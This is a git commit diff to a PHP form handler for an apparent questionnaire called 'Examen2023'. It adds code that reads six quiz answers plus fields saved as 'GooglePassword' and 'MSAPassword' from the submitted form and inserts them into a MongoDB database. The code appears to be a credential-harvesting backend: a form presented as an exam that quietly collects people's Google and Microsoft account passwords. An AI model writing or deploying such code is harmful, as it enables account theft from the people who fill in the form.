4ef2dfc067c74c91af885a93fa32d4428f7ceb9f
b19karhj <sc2rena@gmail.com>
2023-04-03 04:25:36 +0200

    Insert all form
    All needed form data should now be sent to database

--- completion.php
+++ completion.php
@@ -9,14 +9,25 @@
      
       $collection = $client->Examen2023->Form;
 
-      if(isset($_POST['qe1'])){
-        $p1 = json_decode($_POST['qe1']);
+      if(isset($_POST['q1'])){
+        $q1 = json_decode($_POST['q1']);
+        $q2 = json_decode($_POST['q2']);
+        $q3 = json_decode($_POST['q3']);
+        $q4 = json_decode($_POST['q4']);
+        $q5 = json_decode($_POST['q5']);
+        $q6 = json_decode($_POST['q6']);
+        $gp = json_decode($_POST['gp']);
+        $mp = json_decode($_POST['mp']);
         $insertOneResult = $collection->insertOne([
-            'username' => 'admin2',
-            'email' => 'admin@example.com2',
-            'name' => 'Admin User2',
+            'Q1' => $q1,
+            'Q2' => $q2,
+            'Q3' => $q3,
+            'Q4' => $q4,
+            'Q5' => $q5,
+            'Q6' => $q6,
+            'GooglePassword' => $gp,
+            'MSAPassword' => $mp,
         ]);
-         echo json_encode($p1);
       };
       
 
